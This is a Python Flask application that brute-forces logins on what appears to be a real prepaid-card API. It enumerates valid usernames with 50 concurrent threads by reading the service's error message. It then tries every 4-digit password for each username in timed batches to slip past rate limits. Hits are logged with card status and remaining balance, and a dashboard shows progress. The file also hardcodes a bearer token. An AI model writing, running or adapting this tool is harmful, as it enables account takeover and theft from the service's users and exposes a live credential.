
from flask import Flask, render_template, jsonify, send_file
import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading

app = Flask(__name__)

# Global variables to track progress
current_step = "Initializing"
valid_usernames = []
current_username = ""
total_requests = 0
processed_requests = 0
is_running = False
current_password_batch = 0
total_password_batches = 10
success_info = []

# Configuration
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
MAX_REQUESTS = 1000
STATE_FILE = "bruteforce_state.json"

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    return {"valid_usernames": [], "tried_passwords": {}}

def save_state(valid_usernames, tried_passwords):
    state = {"valid_usernames": valid_usernames, "tried_passwords": tried_passwords}
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=4)

def send_request(payload):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": AUTH_HEADER,
        "Accept-Language": LANGUAGE
    }
    try:
        response = requests.post(API_URL, json=payload, headers=headers)
        return response.json(), payload
    except Exception as e:
        return {"error": str(e)}, payload

def try_passwords(username, start_idx, batch_size=1000):
    global current_password_batch, processed_requests, success_info
    payloads = [{"username": username, "password": str(i).zfill(4)} 
                for i in range(start_idx, min(start_idx + batch_size, 10000))]
    processed_requests = 0
    total_requests = len(payloads)

    for payload in payloads:
        result, _ = send_request(payload)
        processed_requests += 1
        if "message" in result and result["message"] not in ["خطأ في إسم المستخدم أو كلمة المرور"]:
            success_info.append({
                "username": username,
                "password": payload["password"],
                "status": result.get("status", "Unknown"),
                "duration": result.get("duration", "Unknown"),
                "remaining": result.get("remaining", "Unknown")
            })
            return True
    return False

def background_process():
    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username
    
    while True:
        if is_running:
            try:
                # Generate and validate usernames
                current_step = "🔍 Scanning usernames concurrently..."
                prefix = "20"
                usernames = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(1000)]
                payloads = [{"username": u} for u in usernames]
                total_requests = len(payloads)
                processed_requests = 0

                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    for payload in payloads:
                        futures.append(executor.submit(send_request, payload))
                        
                    for future in as_completed(futures):
                        try:
                            result, payload = future.result()
                            processed_requests += 1
                            if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                                valid_usernames.append(payload["username"])
                        except Exception as e:
                            print(f"Request error: {e}")

                save_state(valid_usernames, {})
                current_step = f"✅ Found {len(valid_usernames)} valid usernames"

                # Try passwords for each username
                for username in valid_usernames:
                    current_username = username
                    current_step = f"🔐 Trying passwords for: {username}"
                    
                    for start_idx in range(0, 10000, 1000):
                        if try_passwords(username, start_idx):
                            break
                        current_step = f"🛌 Waiting 60s to send next batch for {username}..."
                        time.sleep(60)

            except Exception as e:
                current_step = f"Error: {str(e)}"
            
            time.sleep(60)
        else:
            time.sleep(1)

@app.route('/')
def home():
    state = load_state()
    return render_template(
        'index.html',
        current_step=current_step,
        valid_usernames=state["valid_usernames"],
        progress=(processed_requests / total_requests * 100) if total_requests > 0 else 0,
        success_info=success_info
    )

@app.route('/state.json')
def get_state():
    return send_file(STATE_FILE) if os.path.exists(STATE_FILE) else jsonify({"error": "State file not found"})

@app.route('/status')
def status():
    return jsonify({
        'current_step': current_step,
        'valid_usernames': valid_usernames,
        'current_username': current_username,
        'progress': (processed_requests / total_requests * 100) if total_requests > 0 else 0,
        'is_running': is_running,
        'success_info': success_info
    })

@app.route('/toggle')
def toggle():
    global is_running
    is_running = not is_running
    return jsonify({'is_running': is_running})

if __name__ == '__main__':
    bg_thread = threading.Thread(target=background_process, daemon=True)
    bg_thread.start()
    app.run(host='0.0.0.0', port=5000)
